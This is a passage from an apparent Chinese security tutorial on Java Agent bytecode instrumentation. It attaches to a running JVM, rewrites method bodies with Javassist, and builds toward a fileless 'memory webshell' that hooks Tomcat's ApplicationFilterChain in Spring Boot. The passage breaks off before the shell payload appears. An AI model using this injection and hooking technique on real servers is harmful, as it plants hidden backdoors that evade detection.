class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_Instrumentation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        Class [] classes = inst.getAllLoadedClasses();<br> <br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            System.out.println(<span class="hljs-string">&quot;------------------------------------------&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;加载类: &quot;</span>+cls.getName());<br>            System.out.println(<span class="hljs-string">&quot;是否可被修改: &quot;</span>+inst.isModifiableClass(cls));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注入目标进程，结果如下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Hello World!<br><span class="hljs-section">Hello World!</span><br><span class="hljs-section">------------------------------------------</span><br>加载类: com.java.agentmain.instrumentation.Java<span class="hljs-emphasis">_Agent_agentmain_Instrumentation</span><br><span class="hljs-emphasis">是否可被修改: true</span><br><span class="hljs-emphasis">------------------------------------------</span><br><span class="hljs-emphasis">加载类: Sleep_</span>Hello<br><span class="hljs-section">是否可被修改: true</span><br><span class="hljs-section">------------------------------------------</span><br>加载类: com.intellij.rt.execution.application.AppMainV2$1<br><span class="hljs-section">是否可被修改: true</span><br><span class="hljs-section">------------------------------------------</span><br>加载类: com.intellij.rt.execution.application.AppMainV2<br><span class="hljs-section">是否可被修改: true</span><br><span class="hljs-section">------------------------------------------</span><br>加载类: com.intellij.rt.execution.application.AppMainV2$Agent<br>是否可被修改: true<br><span class="hljs-code"> </span><br>...<br></code></pre></td></tr></table></figure><h5 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h5><p>在Instrumentation接口中，我们可以通过<code>addTransformer()</code>来添加一个<code>transformer</code>（转换器），关键属性就是<code>ClassFileTransformer</code>类。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span><br>    void add<span class="hljs-constructor">Transformer(ClassFileTransformer <span class="hljs-params">transformer</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">canRetransform</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>ClassFileTransformer</code>接口中只有一个<code>transform()</code>方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br> <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className           完全限定类内部形式的类名称,格式如:java/lang/Runtime</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span><br><span class="hljs-comment">     */</span><br>    <br>    <span class="hljs-type">byte</span>[] transform(  ClassLoader         loader,<br>                String              className,<br>                Class&lt;?&gt;            classBeingRedefined,<br>                ProtectionDomain    protectionDomain,<br>                <span class="hljs-type">byte</span>[]              classfileBuffer)<br>        <span class="hljs-keyword">throws</span> IllegalClassFormatException;<br>&#125;<br></code></pre></td></tr></table></figure><p>在通过 <code>addTransformer</code> 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过<code>ClassLoader.defineClass</code>加载进来的类。而重定义是通过<code>Instrumentation.redefineClasses</code>方法重定义的类。</p><p>当存在多个转换器时，转换将由 <code>transform</code> 调用链组成。 也就是说，一个 <code>transform</code> 调用返回的 byte 数组将成为下一个调用的输入（通过 <code>classfileBuffer</code> 参数）。</p><p>转换将按以下顺序应用：</p><ul><li>不可重转换转换器</li><li>不可重转换本机转换器</li><li>可重转换转换器</li><li>可重转换本机转换器</li></ul><p>至于transformer中对字节码的具体操作，则需要使用到Javassisit类。在<a href="https://goodapple.top/archives/1145#header-id-20">这篇文章</a>中，我已经介绍过了Javassist的用法。下面我就来修改一个正在运行JVM的字节码。</p><h5 id="修改目标JVM的Class字节码"><a href="#修改目标JVM的Class字节码" class="headerlink" title="修改目标JVM的Class字节码"></a>修改目标JVM的Class字节码</h5><p>首先编写一个目标类<code>com.sleep.hello.Sleep_Hello.java</code></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.sleep.hello;<br> <br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sleep_Hello</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException </span>&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>)&#123;<br>            hello();<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写一个agentmain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.agentmain.instrumentation.transformer;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><span class="hljs-keyword">import</span> java.lang.instrument.UnmodifiableClassException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_transform</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;<br>        Class [] classes = inst.getAllLoadedClasses();<br> <br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;com.sleep.hello.Sleep_Hello&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello_Transform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继承<code>ClassFileTransformer</code>类编写一个transformer，修改对应类的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.agentmain.instrumentation.transformer;<br> <br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello_Transform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br> <br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br> <br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;com.sleep.hello.Sleep_Hello&quot;</span>);<br> <br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;hello&quot;</span>);<br> <br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br> <br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br> <br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编写Inject_Agent类，将agentmain-Agent注入到目标JVM中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.inject;<br> <br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br> <br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Agent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br> <br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.sleep.hello.Sleep_Hello&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br> <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里使用到了<code>tools.jar</code>工具包，IDEA默认不会导入为lib，我们手动导入即可</p><p>然后将agentmain-Agent打为jar包，注意这里将tools和javassist依赖一并打包</p><p><code>Java_Agent.jar</code>目录结构如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140039152.png" alt="image-20240302140039152"> </p><p>首先运行目标类，然后运行<code>Inject_Agent</code>类，注入Agent</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140029402.png" alt="image-20240302140029402"></p><h3 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h3><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p><p>premain和agentmain两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义I<code>nstrumentation#redefineClasses</code>方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是private static&#x2F;final修饰的</li><li>可以修改方法体</li></ol><h3 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h3><p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p><p>这里我们以Spring Boot为例，来实现一个Agent内存马</p><h4 id="Spring-Boot中的Tomcat"><a href="#Spring-Boot中的Tomcat" class="headerlink" title="Spring Boot中的Tomcat"></a>Spring Boot中的Tomcat</h4><p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Context:<span class="hljs-number">20</span>, Context_Learn (com<span class="hljs-selector-class">.example</span>.spring_controller)<br>...<br>(org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.mvc</span><span class="hljs-selector-class">.method</span>.annotation)<br>handleInternal:<span class="hljs-number">808</span>, RequestMappingHandlerAdapter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.mvc</span><span class="hljs-selector-class">.method</span>.annotation)<br>handle:<span class="hljs-number">87</span>, AbstractHandlerMethodAdapter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.mvc</span>.method)<br>doDispatch:<span class="hljs-number">1067</span>, DispatcherServlet (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.servlet)<br>doService:<span class="hljs-number">963</span>, DispatcherServlet (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.servlet)<br>processRequest:<span class="hljs-number">1006</span>, FrameworkServlet (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.servlet)<br>doGet:<span class="hljs-number">898</span>, FrameworkServlet (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.servlet)<br>service:<span class="hljs-number">655</span>, HttpServlet (javax<span class="hljs-selector-class">.servlet</span>.http)<br>service:<span class="hljs-number">883</span>, FrameworkServlet (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.servlet)<br>service:<span class="hljs-number">764</span>, HttpServlet (javax<span class="hljs-selector-class">.servlet</span>.http)<br>internalDoFilter:<span class="hljs-number">227</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">53</span>, WsFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.websocket</span>.server)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilterInternal:<span class="hljs-number">100</span>, RequestContextFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilterInternal:<span class="hljs-number">93</span>, FormContentFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilterInternal:<span class="hljs-number">201</span>, CharacterEncodingFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.<span class="hljs-attribute">filter</span>)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>...<br></code></pre></td></tr></table></figure><p>可以看到会按照责任链机制反复调用<code>ApplicationFilterChain#doFilter()</code>方法</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">public</span> void <span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(ServletRequest <span class="hljs-built_in">request</span>, ServletResponse <span class="hljs-built_in">response</span>)<br>        throws IOException, ServletException &#123;<br> <br>        <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>            final ServletRequest req = <span class="hljs-built_in">request</span>;<br>            final ServletResponse res = <span class="hljs-built_in">response</span>;<br>            try &#123;<br>                java.security.AccessController.doPrivileged(<br>                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;<br>                            internalDo<span class="hljs-built_in">Filter</span>(req,res);<br>                            return <span class="hljs-literal">null</span>;<br>                        &#125;<br>                );<br>            &#125; ...<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            internalDo<span class="hljs-built_in">Filter</span>(<span class="hljs-built_in">request</span>,<span class="hljs-built_in">response</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟到internalDoFilter()方法中</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  ServletResponse response)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br> <br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            ...<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h4 id="利用Java-Agent实现Spring-Filter内存马"><a href="#利用Java-Agent实现Spring-Filter内存马" class="headerlink" title="利用Java Agent实现Spring Filter内存马"></a>利用Java Agent实现Spring Filter内存马</h4><p>我们复用上面的agentmain-Agent，修改字节码的关键在于<code>transformer()</code>方法，因此我们重写该方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.agentmain.instrumentation.transformer;<br> <br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_Transform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br> <br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br> <br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br> <br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span 